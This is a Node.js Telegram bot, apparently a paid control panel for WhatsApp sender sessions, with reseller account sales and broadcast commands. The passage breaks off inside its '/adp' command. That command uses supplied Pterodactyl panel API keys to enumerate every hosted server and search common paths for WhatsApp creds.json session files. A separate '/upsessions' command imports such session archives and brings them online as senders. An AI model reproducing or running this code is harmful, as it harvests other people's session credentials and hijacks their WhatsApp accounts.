const { Telegraf } = require("telegraf");
const { Markup } = require('telegraf');
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/ControlApps.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch");
const os = require('os');
const AdmZip = require('adm-zip');
const tar = require('tar');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const cors = require("cors");

// ✅ AMBIL KONFIGURASI
const tokens = config.tokens;
const OwnerId = config.Developer || (Array.isArray(config.owner) ? config.owner[0] : "7464121207");
const PORT = parseInt(config.port) || 2000;
const VPS = config.ipvps || "0.0.0.0";

const bot = new Telegraf(tokens);
const app = express();

// ✅ Middleware
app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors());

const ownerIds = [OwnerId];
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/Visstable.json";
const userPath = path.join(__dirname, "./database/user.json");
let userApiBug = null;
let sock;
let globalMessages = [];
let lastExecution = 0;

// ✅ Import Baileys
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestWaWebVersion,
    generateWAMessageFromContent,
    proto,
    delay
} = require("@whiskeysockets/baileys");

// ==================== FUNGSI HELPER ====================

function loadAkses() {
    if (!fs.existsSync(file)) {
        const initData = {
            owners: [],
            akses: [],
            resellers: [],
            pts: [],
            moderators: []
        };
        fs.writeFileSync(file, JSON.stringify(initData, null, 2));
        return initData;
    }

    let data = JSON.parse(fs.readFileSync(file));
    if (!data.resellers) data.resellers = [];
    if (!data.pts) data.pts = [];
    if (!data.moderators) data.moderators = [];

    return data;
}

function saveAkses(data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
    const data = loadAkses();
    return data.owners.includes(id.toString());
}

function isAuthorized(id) {
    const data = loadAkses();
    return (
        isOwner(id) ||
        data.akses.includes(id.toString()) ||
        data.resellers.includes(id.toString()) ||
        data.pts.includes(id.toString()) ||
        data.moderators.includes(id.toString())
    );
}

function isReseller(id) {
    const data = loadAkses();
    return data.resellers.includes(id.toString());
}

function isPT(id) {
    const data = loadAkses();
    return data.pts.includes(id.toString());
}

function isModerator(id) {
    const data = loadAkses();
    return data.moderators.includes(id.toString());
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function generateKey(length = 4) {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
    return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
    const match = str.match(/^(\d+)([dh])$/);
    if (!match) return null;
    const value = parseInt(match[1]);
    const unit = match[2];
    return unit === "d" ? value * 86400000 : value * 3600000;
}

function getUsers() {
    const filePath = path.join(__dirname, "database", "user.json");
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([], null, 2));
        return [];
    }
    try {
        return JSON.parse(fs.readFileSync(filePath, "utf-8"));
    } catch (err) {
        console.error("✗ Gagal membaca user.json:", err);
        return [];
    }
}

function saveUsers(users) {
    const filePath = path.join(__dirname, "database", "user.json");
    try {
        fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
        console.log("✓ Data user berhasil disimpan.");
    } catch (err) {
        console.error("✗ Gagal menyimpan user:", err);
    }
}

function getRuntime(seconds) {
    seconds = Number(seconds);
    var d = Math.floor(seconds / (3600 * 24));
    var h = Math.floor(seconds % (3600 * 24) / 3600);
    var m = Math.floor(seconds % 3600 / 60);
    var s = Math.floor(seconds % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
}

// ==================== WHATSAPP SESSION ====================

const saveActive = (BotNumber) => {
    const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
    if (!list.includes(BotNumber)) {
        fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
    }
};

const delActive = (BotNumber) => {
    if (!fs.existsSync(file_session)) return;
    const list = JSON.parse(fs.readFileSync(file_session));
    const newList = list.filter(num => num !== BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(newList));
    console.log(`✓ Nomor ${BotNumber} berhasil dihapus dari sesi`);
};

const sessionPath = (BotNumber) => {
    const dir = path.join(sessions_dir, `device${BotNumber}`);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    return dir;
};

function makeBox(title, lines) {
    const contentLengths = [
        title.length,
        ...lines.map(l => l.length)
    ];
    const maxLen = Math.max(...contentLengths);

    const top = "╔" + "═".repeat(maxLen + 2) + "╗";
    const middle = "╠" + "═".repeat(maxLen + 2) + "╣";
    const bottom = "╚" + "═".repeat(maxLen + 2) + "╝";

    const padCenter = (text, width) => {
        const totalPad = width - text.length;
        const left = Math.floor(totalPad / 2);
        const right = totalPad - left;
        return " ".repeat(left) + text + " ".repeat(right);
    };

    const padRight = (text, width) => {
        return text + " ".repeat(width - text.length);
    };

    const titleLine = "║ " + padCenter(title, maxLen) + " ║";
    const contentLines = lines.map(l => "║ " + padRight(l, maxLen) + " ║");

    return `<blockquote>
${top}
${titleLine}
${middle}
${contentLines.join("\n")}
${bottom}
</blockquote>`;
}

const makeStatus = (number, status) => makeBox("ＳＴＡＴＵＳ", [
    `Ｎｕｍｅｒｏ : ${number}`,
    `Ｅｓｔａｄｏ : ${status.toUpperCase()}`
]);

const makeCode = (number, code) => ({
    text: makeBox("ＳＴＡＴＵＳ ＰＡＩＲ", [
        `Ｎｕｍｅｒｏ : ${number}`,
        `Ｃｏ́ｄｉｇｏ : ${code}`
    ]),
    parse_mode: "HTML"
});

const initializeWhatsAppConnections = async () => {
    if (!fs.existsSync(file_session)) return;
    const activeNumbers = JSON.parse(fs.readFileSync(file_session));

    console.log(chalk.blue(`
╔════════════════════════════╗
║      SESSÕES ATIVAS DO WA
╠════════════════════════════╣
║  QUANTIDADE : ${activeNumbers.length}
╚════════════════════════════╝`));

    for (const BotNumber of activeNumbers) {
        console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
        const sessionDir = sessionPath(BotNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestWaWebVersion();

        sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            version: version,
            defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve) => {
            sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
                if (connection === "open") {
                    console.log(`Bot ${BotNumber} terhubung!`);
                    sessions.set(BotNumber, sock);
                    return resolve();
                }
                if (connection === "close") {
                    const shouldReconnect =
                        lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

                    if (shouldReconnect) {
                        console.log("Koneksi tertutup, mencoba reconnect...");
                        await initializeWhatsAppConnections();
                    } else {
                        console.log("Koneksi ditutup permanen (Logged Out).");
                    }
                }
            });
            sock.ev.on("creds.update", saveCreds);
        });
    }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    let statusMessage = await ctx.reply(`Pareando com o número ${BotNumber}...`, { parse_mode: "HTML" });

    const editStatus = async (text) => {
        try {
            await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
        } catch (e) {
            console.error("Falha ao editar mensagem:", e.message);
        }
    };

    const { version } = await fetchLatestWaWebVersion();

    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
    });

    let isConnected = false;

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "close") {
            const code = lastDisconnect?.error?.output?.statusCode;

            if (code >= 500 && code < 600) {
                await editStatus(makeStatus(BotNumber, "Reconectando..."));
                return await connectToWhatsApp(BotNumber, chatId, ctx);
            }

            if (!isConnected) {
                await editStatus(makeStatus(BotNumber, "✗ Falha na conexão."));
            }
        }

        if (connection === "open") {
            isConnected = true;
            sessions.set(BotNumber, sock);
            saveActive(BotNumber);
            return await editStatus(makeStatus(BotNumber, "✓ Conectado com sucesso."));
        }

        if (connection === "connecting") {
            await new Promise(r => setTimeout(r, 1000));
            try {
                if (!fs.existsSync(`${sessionDir}/creds.json`)) {
                    const code = await sock.requestPairingCode(BotNumber, "DEVILBOS");
                    const formatted = code.match(/.{1,4}/g)?.join("-") || code;
                    await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null,
                        makeCode(BotNumber, formatted).text, {
                        parse_mode: "HTML",
                        reply_markup: makeCode(BotNumber, formatted).reply_markup
                    });
                }
            } catch (err) {
                console.error("Erro ao solicitar código:", err);
                await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
            }
        }
    });

    sock.ev.on("creds.update", saveCreds);
    return sock;
};

// ==================== TELEGRAM BOT COMMANDS ====================

// --- VARIABEL TEXT UTAMA (Header) ---
const getHeader = (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const botUser = ctx.botInfo?.username || "Bot";
    const runtime = getRuntime(process.uptime());

    return `
<blockquote>💢 Obsidian Core ☇ Control\nWhere Are To ${username}, To Bot Control Apps Bosidian Version 3.4.1 Beta</blockquote>
━━━━━━━━━━━━━━━
<blockquote>Apss Information</blockquote>
メ NameBot : @${botUser}
メ NameApps : Obsidian
メ Version : 3.4.1 Beta
メ CreateBase : @XangelXy
メ Server : Online⚡
メ Runtime : ${runtime}
━━━━━━━━━━━━━━━`;
};

// === Command: Add Reseller ===
bot.command("addresseler", async (ctx) => {
    const userId = ctx.from.id.toString();
    const targetId = ctx.message.text.split(" ")[1];

    if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
        return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin untuk menambah akses.", { parse_mode: "HTML" });
    }

    if (!targetId) {
        return ctx.reply("⚠️ <b>Format Salah!</b>\nGunakan: <code>/resseler ID_TELEGRAM</code>\nContoh: <code>/addakses 1234567890</code>", { parse_mode: "HTML" });
    }

    const data = loadAkses();

    if (data.resellers.includes(targetId)) {
        return ctx.reply("⚠️ User tersebut sudah menjadi Reseller.");
    }

    if (data.owners.includes(targetId)) {
        return ctx.reply("⚠️ User tersebut adalah Owner.");
    }

    data.resellers.push(targetId);
    saveAkses(data);

    await ctx.reply(
        `✅ <b>Sukses Menambahkan Resseler !</b>\n\n` +
        `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
        `💼 <b>Posisi:</b> Resseler Apps\n\n` +
        `<i>User ini sekarang bisa menggunakan bot untuk membuat SSH/Akun, namun role yang dibuat dibatasi hanya <b>User/Member</b>.</i>`,
        { parse_mode: "HTML" }
    );
});

bot.command("delakses", (ctx) => {
    const userId = ctx.from.id.toString();
    const id = ctx.message.text.split(" ")[1];

    if (!isOwner(userId)) {
        return ctx.reply("🚫 Akses ditolak.");
    }
    if (!id) return ctx.reply("Usage: /delreseller <id>");

    const data = loadAkses();
    data.resellers = data.resellers.filter(uid => uid !== id);
    saveAkses(data);

    ctx.reply(`✓ Reseller removed: ${id}`);
});

// === Command: Add PT ===
bot.command("addpt", async (ctx) => {
    const userId = ctx.from.id.toString();
    const targetId = ctx.message.text.split(" ")[1];

    if (!isOwner(userId) && !isModerator(userId)) {
        return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin.", { parse_mode: "HTML" });
    }

    if (!targetId) {
        return ctx.reply("⚠️ Gunakan format: <code>/addpt ID_TELEGRAM</code>", { parse_mode: "HTML" });
    }

    const data = loadAkses();

    if (data.pts.includes(targetId)) {
        return ctx.reply("⚠️ User tersebut sudah menjadi PT.");
    }

    if (data.owners.includes(targetId)) {
        return ctx.reply("⚠️ User tersebut adalah Owner.");
    }

    data.pts.push(targetId);
    saveAkses(data);

    await ctx.reply(
        `✅ <b>Sukses Menambahkan PT!</b>\n\n` +
        `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
        `🤝 <b>Posisi:</b> Partner (PT)\n\n` +
        `<i>User ini sekarang bisa membuat akun dengan role <b>Member</b> dan <b>Reseller</b>.</i>`,
        { parse_mode: "HTML" }
    );
});

bot.command("delpt", (ctx) => {
    const userId = ctx.from.id.toString();
    const id = ctx.message.text.split(" ")[1];

    if (!isOwner(userId)) {
        return ctx.reply("🚫 Akses ditolak.");
    }
    if (!id) return ctx.reply("Usage: /delpt <id>");

    const data = loadAkses();
    data.pts = data.pts.filter(uid => uid !== id);
    saveAkses(data);

    ctx.reply(`✓ PT removed: ${id}`);
});

// === Command: Add Moderator ===
bot.command("addowner", async (ctx) => {
    const userId = ctx.from.id.toString();
    const targetId = ctx.message.text.split(" ")[1];

    if (!isOwner(userId)) {
        return ctx.reply("⛔ <b>Akses Ditolak!</b>\nAnda tidak memiliki izin untuk mengangkat Owner baru.", { parse_mode: "HTML" });
    }

    if (!targetId) {
        return ctx.reply("⚠️ Gunakan format: <code>/addowner ID_TELEGRAM</code>", { parse_mode: "HTML" });
    }

    const data = loadAkses();

    if (data.owners.includes(targetId)) {
        return ctx.reply("⚠️ User tersebut sudah menjadi Owner.");
    }

    data.owners.push(targetId);

    data.resellers = data.resellers.filter(id => id !== targetId);
    data.pts = data.pts.filter(id => id !== targetId);
    data.moderators = data.moderators.filter(id => id !== targetId);

    saveAkses(data);

    await ctx.reply(
        `✅ <b>Sukses Menambahkan Owner Baru!</b>\n\n` +
        `🆔 <b>ID:</b> <code>${targetId}</code>\n` +
        `👑 <b>Posisi:</b> Owner / Developer\n\n` +
        `<i>User ini sekarang memiliki <b>FULL AKSES</b>.\nBisa membuat semua jenis role (Owner, Admin, PT, Reseller, dll) di command /addakun.</i>`,
        { parse_mode: "HTML" }
    );
});

bot.command("delowner", (ctx) => {
    const userId = ctx.from.id.toString();
    const id = ctx.message.text.split(" ")[1];

    if (!isOwner(userId)) {
        return ctx.reply("🚫 Akses ditolak.");
    }
    if (!id) return ctx.reply("Usage: /delowner <id>");

    const data = loadAkses();
    data.moderators = data.moderators.filter(uid => uid !== id);
    saveAkses(data);

    ctx.reply(`✓ Owner removed: ${id}`);
});

// --- COMMAND START ---
bot.command("start", async (ctx) => {
    const loadingMsg = await ctx.reply('<blockquote>📡 Sabar Bree Sedang Menyiapkan Menu Page</blockquote>', { parse_mode: 'HTML' });
    await new Promise(resolve => setTimeout(resolve, 2000));
    await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => { });

    const textMain = `${getHeader(ctx)}
<blockquote>☇ Silahkan Pilih Menu Dibawah Ya Bree</blockquote>
`;

    const keyboardMain = Markup.inlineKeyboard([
        [
            Markup.button.callback('Control ϟ Menu', 'menu_control'),
            Markup.button.callback('Settings ϟ Account', 'menu_account')
        ],
        [
            Markup.button.callback('Owner ϟ Access', 'menu_owner'),
            Markup.button.url('Developer ϟ Apps', 'https://t.me/XangelXy')
        ]
    ]);

    await ctx.replyWithPhoto(
        { url: "https://i.pinimg.com/736x/ba/de/3e/bade3e93373ad9bc3b27d329ce87cf92.jpg" },
        {
            caption: textMain,
            parse_mode: "HTML",
            ...keyboardMain
        }
    );

    await ctx.replyWithAudio(
        { url: "https://files.catbox.moe/mdoxtb.mp3" },
        {
            caption: "Welcome To Bot Apps",
            parse_mode: "HTML",
            performer: "Obsidian System",
            title: "System Booting Sound"
        }
    );
});

bot.action('menu_control', async (ctx) => {
    const textControl = `${getHeader(ctx)}
<blockquote>Control The Apps</blockquote>
/Pairing ⎧ Number Sender ⎭
/listsender ⎧ Cek Sender Actived ⎭
`;

    const keyboardControl = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    await ctx.editMessageCaption(textControl, { parse_mode: 'HTML', ...keyboardControl }).catch(() => { });
});

bot.action('menu_account', async (ctx) => {
    const textAccount = `${getHeader(ctx)}
<blockquote>🛡️ Account Control</blockquote>
/CreateAccount ⎧ Create New Account ⎭
/listakun ⎧ Cek Daftar Akun ⎭
`;

    const keyboardAccount = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    await ctx.editMessageCaption(textAccount, { parse_mode: 'HTML', ...keyboardAccount }).catch(() => { });
});

bot.action('menu_owner', async (ctx) => {
    const textOwner = `${getHeader(ctx)}
<b>AKSES HANYA DIBERIKAN KEPADA XANGEL</b>
`;

    const keyboardOwner = Markup.inlineKeyboard([
        [Markup.button.callback('! Back To Home', 'back_home')]
    ]);

    await ctx.editMessageCaption(textOwner, { parse_mode: 'HTML', ...keyboardOwner }).catch(() => { });
});

bot.action('back_home', async (ctx) => {
    const textMain = `${getHeader(ctx)}
<blockquote>☇ Silahkan Pilih Menu Dibawah Ya Bree</blockquote>
`;

    const keyboardMain = Markup.inlineKeyboard([
        [
            Markup.button.callback('Control ϟ Menu', 'menu_control'),
            Markup.button.callback('Settings ϟ Account', 'menu_account')
        ],
        [
            Markup.button.callback('Owner ϟ Access', 'menu_owner'),
            Markup.button.url('Developer ϟ Apps', 'https://t.me/XangelXy')
        ]
    ]);

    await ctx.editMessageCaption(textMain, { parse_mode: 'HTML', ...keyboardMain }).catch(() => { });
});

bot.command("Pairing", async (ctx) => {
    const args = ctx.message.text.split(" ");

    if (args.length < 2) {
        return ctx.reply("✗ Falha\n\nExample : /addbot 628xxxx", { parse_mode: "HTML" });
    }

    const BotNumber = args[1];
    await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("delsesi", async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    const BotNumber = args[0];

    if (!BotNumber) {
        return ctx.reply("❌ Gunakan format:\n/delsesi <nomor>");
    }

    try {
        delActive(BotNumber);

        const dir = sessionPath(BotNumber);
        if (fs.existsSync(dir)) {
            fs.rmSync(dir, { recursive: true, force: true });
        }

        await ctx.reply(`Sesi untuk nomor *${BotNumber}* berhasil dihapus.`, { parse_mode: "Markdown" });
    } catch (err) {
        console.error("Gagal hapus sesi:", err);
        await ctx.reply(`❌ Gagal hapus sesi untuk nomor *${BotNumber}*.\nError: ${err.message}`, { parse_mode: "Markdown" });
    }
});

bot.command("listsender", (ctx) => {
    if (sessions.size === 0) return ctx.reply("Gak ada sender wlee");

    const daftarSender = [...sessions.keys()]
        .map(n => `• ${n}`)
        .join("\n");

    ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

bot.command("delbot", async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(" ");

    if (!isOwner(userId) && !isAuthorized(userId)) {
        return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
    }

    if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

    const number = args[1];
    if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

    try {
        const sessionDir = sessionPath(number);
        sessions.get(number).end();
        sessions.delete(number);
        fs.rmSync(sessionDir, { recursive: true, force: true });

        const data = JSON.parse(fs.readFileSync(file_session));
        fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
        ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
    } catch (err) {
        console.error(err);
        ctx.reply("Terjadi error saat menghapus sender.");
    }
});

// === Command: /add (Tambah Session WhatsApp dari file reply) ===
bot.command("upsessions", async (ctx) => {
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;

    if (!isOwner(userId)) {
        return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
    }

    const replyMsg = ctx.message.reply_to_message;
    if (!replyMsg || !replyMsg.document) {
        return ctx.reply("❌ Balas file session dengan perintah /add");
    }

    const doc = replyMsg.document;
    const name = doc.file_name.toLowerCase();

    if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
        return ctx.reply("❌ File bukan session (.json/.zip/.tar/.tgz)");
    }

    await ctx.reply("🔄 Memproses session...");

    try {
        const fileLink = await ctx.telegram.getFileLink(doc.file_id);
        const { data } = await axios.get(fileLink.href, { responseType: "arraybuffer" });
        const buf = Buffer.from(data);
        const tmp = await fs.promises.mkdtemp(path.join(os.tmpdir(), "sess-"));

        if (name.endsWith(".json")) {
            await fs.promises.writeFile(path.join(tmp, "creds.json"), buf);
        } else if (name.endsWith(".zip")) {
            new AdmZip(buf).extractAllTo(tmp, true);
        } else {
            const tmpTar = path.join(tmp, name);
            await fs.promises.writeFile(tmpTar, buf);
            await tar.x({ file: tmpTar, cwd: tmp });
        }

        const findCredsFile = async (dir) => {
            const files = await fs.promises.readdir(dir, { withFileTypes: true });
            for (const file of files) {
                const filePath = path.join(dir, file.name);
                if (file.isDirectory()) {
                    const found = await findCredsFile(filePath);
                    if (found) return found;
                } else if (file.name === "creds.json") {
                    return filePath;
                }
            }
            return null;
        };

        const credsPath = await findCredsFile(tmp);
        if (!credsPath) {
            return ctx.reply("❌ creds.json tidak ditemukan di file session.");
        }

        const creds = JSON.parse(await fs.promises.readFile(credsPath, "utf8"));
        const botNumber = creds?.me?.id ? creds.me.id.split(":")[0] : null;
        if (!botNumber) return ctx.reply("❌ creds.json tidak valid (me.id tidak ditemukan)");

        const destDir = sessionPath(botNumber);
        await fs.promises.rm(destDir, { recursive: true, force: true });
        await fs.promises.mkdir(destDir, { recursive: true });

        const copyDir = async (src, dest) => {
            const entries = await fs.promises.readdir(src, { withFileTypes: true });
            for (const entry of entries) {
                const srcPath = path.join(src, entry.name);
                const destPath = path.join(dest, entry.name);
                if (entry.isDirectory()) {
                    await fs.promises.mkdir(destPath, { recursive: true });
                    await copyDir(srcPath, destPath);
                } else {
                    await fs.promises.copyFile(srcPath, destPath);
                }
            }
        };
        await copyDir(tmp, destDir);

        const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
        if (!list.includes(botNumber)) {
            fs.writeFileSync(file_session, JSON.stringify([...list, botNumber]));
        }

        await connectToWhatsApp(botNumber, chatId, ctx);

        return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan dan online.`, { parse_mode: "Markdown" });

    } catch (err) {
        console.error("❌ Error /add:", err);
        return ctx.reply(`❌ Gagal memproses session:\n${err.message}`);
    }
});

bot.command("CreateAccount", async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(" ")[1];

    if (!isOwner(userId) && !isAuthorized(userId)) {
        return ctx.reply("😹—Lu siapa tolol, Buy Account Only @xangelxy");
    }

    if (!args || !args.includes(",")) {
        return ctx.reply(
            "<blockquote> Tutorial Cara Create Account</blockquote>\n" +
            "1. Ketik /addakun\n" +
            "2. Format: username,durasi,role,customKey\n" +
            "3. Contoh: /CreateAccount Keiraa,30d,owner,Stecu",
            { parse_mode: "HTML" }
        );
    }

    const parts = args.split(",");
    const username = parts[0].trim();
    const durasiStr = parts[1].trim();
    const roleInput = parts[2] ? parts[2].trim().toLowerCase() : "user";
    const customKey = parts[3] ? parts[3].trim() : null;

    const durationMs = parseDuration(durasiStr);
    if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

    const key = customKey || generateKey(4);
    const expired = Date.now() + durationMs;
    const users = getUsers();

    const userIndex = users.findIndex(u => u.username === username);
    const userData = {
        username,
        key,
        expired,
        role: roleInput
    };

    if (userIndex !== -1) {
        users[userIndex] = userData;
    } else {
        users.push(userData);
    }

    saveUsers(users);

    const expiredStr = new Date(expired).toLocaleString("id-ID", {
        year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit",
        timeZone: "Asia/Jakarta"
    });

    try {
        await ctx.reply("💢 Succesfull Create Your Account");

        const keyboard = {
            reply_markup: {
                inline_keyboard: [[{ text: "! Chanel ☇ Apps", url: "https://t.me/Keiraa_About" }]]
            }
        };

        await ctx.telegram.sendMessage(
            ctx.from.id,
            `<blockquote>⚙️ Account Succesfull Create </blockquote>\n` +
            `<b>📢 System Sudah Membuat Akun Untuk anda Harap Login Ke akun Anda, Jika Ada Masalah? Hubungi @XangelXy</b>\n\n` +
            `<blockquote>📊 DATA ACCOUNT !!</blockquote>\n` +
            `<b>👤Username:</b> ${username}\n` +
            `<b>🏷️Role:</b> ${roleInput.toUpperCase()}\n` +
            `<b>🛡️Password:</b> <code>${key}</code>\n` +
            `<b>⌛Berlaku:</b> <b>${expiredStr}</b> WIB\n` +
            `<blockquote>‼️ Note Dan Aturan</blockquote>\n` +
            `-Jangan Share Pw And Usn Secara Free !!\n` +
            `-Wajib Join Chanel !!`,
            { parse_mode: "HTML", ...keyboard }
        );
    } catch (error) {
        console.log(error);
        await ctx.reply(
            "✓ Key berhasil dibuat! Namun saya tidak bisa mengirim pesan private kepada Anda.\n\n" +
            "Silakan mulai chat dengan saya terlebih dahulu, lalu gunakan command ini lagi.",
            { parse_mode: "HTML" }
        );
    }
});

bot.command('addpesan', (ctx) => {
    const userId = ctx.from.id.toString();

    if (!isOwner(userId) && !isAuthorized(userId)) {
        return ctx.reply("❌ Akses Ditolak");
    }

    const messageContent = ctx.message.text.split(' ').slice(1).join(' ');

    if (!messageContent) {
        return ctx.reply(
            "⚠️ *Format Broadcast Salah!*\n\nGunakan: `/addpesan <Isi Pesan>`\nContoh: `/addpesan Halo member, ada update baru!`",
            { parse_mode: 'Markdown' }
        );
    }

    const users = getUsers();
    if (users.length === 0) {
        return ctx.reply("❌ Database user kosong. Belum ada akun yang dibuat.");
    }

    let successCount = 0;
    const timestamp = Date.now();
    const senderName = ctx.from.first_name || "Admin";

    users.forEach((user, index) => {
        const msgId = `${timestamp}_${index}`;

        globalMessages.push({
            id: msgId,
            to: user.username,
            from_id: userId,
            sender_name: senderName,
            content: messageContent,
            timestamp: timestamp,
            read: false,
            replied: false
        });

        successCount++;
    });

    ctx.reply(
        `✅ *BROADCAST SUKSES*\n\n` +
        `📦 Pesan: _${messageContent}_\n` +
        `👥 Penerima: *${successCount}* User\n` +
        `📅 Waktu: ${new Date().toLocaleString()}`,
        { parse_mode: 'Markdown' }
    );
});

bot.command("listakun", async (ctx) => {
    const userId = ctx.from.id.toString();
    const users = getUsers();

    if (!isOwner(userId)) {
        return ctx.reply("⛔ <b>Akses Ditolak!</b>\nFitur ini khusus Owner.", { parse_mode: "HTML" });
    }

    if (users.length === 0) return ctx.reply("💢 Belum ada akun yang dibuat.");

    let teks = `<blockquote>☘️ All Account Apps SilentKiller</blockquote>\n\n`;

    users.forEach((u, i) => {
        const userRole = u.role ? u.role.toLowerCase() : "user";
        let roleDisplay = "USER";
        let roleIcon = "👤";

        switch (userRole) {
            case "owner": case "creator":
                roleDisplay = "OWNER"; roleIcon = "👑"; break;
            case "admin":
                roleDisplay = "ADMIN"; roleIcon = "👮"; break;
            case "reseller": case "resell":
                roleDisplay = "RESELLER"; roleIcon = "💼"; break;
            case "moderator": case "mod":
                roleDisplay = "MODERATOR"; roleIcon = "🛡️"; break;
            case "vip":
                roleDisplay = "VIP MEMBER"; roleIcon = "💎"; break;
            case "pt":
                roleDisplay = "PARTNER"; roleIcon = "🤝"; break;
            default:
                roleDisplay = "USER"; roleIcon = "👤"; break;
        }

        const rawKey = u.key ? u.key.toString() : "???";
        let maskedKey = "";
        if (rawKey === "???") {
            maskedKey = "-(Rusak/No Key)-";
        } else if (rawKey.length <= 5) {
            maskedKey = "•".repeat(rawKey.length);
        } else {
            const start = rawKey.slice(0, 2);
            const end = rawKey.slice(-2);
            maskedKey = `${start}•••••${end}`;
        }

        const expTime = u.expired || Date.now();
        const exp = new Date(expTime).toLocaleString("id-ID", {
            year: "numeric", month: "2-digit", day: "2-digit",
            hour: "2-digit", minute: "2-digit",
            timeZone: "Asia/Jakarta"
        });

        teks += `<b>${i + 1}. ${u.username}</b> [ ${roleIcon} ${roleDisplay} ]\n`;
        teks += `   🔑 Key: <code>${maskedKey}</code>\n`;
        teks += `   ⌛ Exp: ${exp} WIB\n\n`;
    });

    await ctx.reply(teks, { parse_mode: "HTML" });
});

bot.command("delakun", (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.message.text.split(" ")[1];

    if (!isOwner(userId) && !isAuthorized(userId)) {
        return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
    }

    if (!username) return ctx.reply("❗Enter username!\nExample: /delkey taitan");

    const users = getUsers();
    const index = users.findIndex(u => u.username === username);
    if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

    users.splice(index, 1);
    saveUsers(users);
    ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("adp", async (ctx) => {
    const REQUEST_DELAY_MS = 250;
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

    const input = ctx.message.text.split(" ").slice(1);
    if (input.length < 3)
        return ctx.reply(
            "Format salah\nContoh: /adp http://domain.com plta_xxxx pltc_xxxx"
        );

    const domainBase = input[0].replace(/\/+$/, "");
    const plta = input[1];
    const pltc = input[2];

    await ctx.reply("🔍 Mencari creds.json di semua server (1x percobaan per server)...");

    try {
        const appRes = await axios.get(`${domainBase}/api/application/servers`, {
            headers: { Accept: "application/json", Authorization: `Bearer ${plta}` },
        });
        const servers = appRes.data?.data || [];
        if (!servers.length) return ctx.reply("❌ Tidak ada server ditemukan.");

        let totalFound = 0;

        for (const srv of servers) {
            const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
            if (!identifier) continue;
            const name = srv.attributes?.name || srv.name || identifier || "unknown";

            const commonPaths = [
                "/home/container/session/creds.json",
                "/home/container/sessions/creds.json",
                "/session/creds.json",
                "/sessions/creds.json",
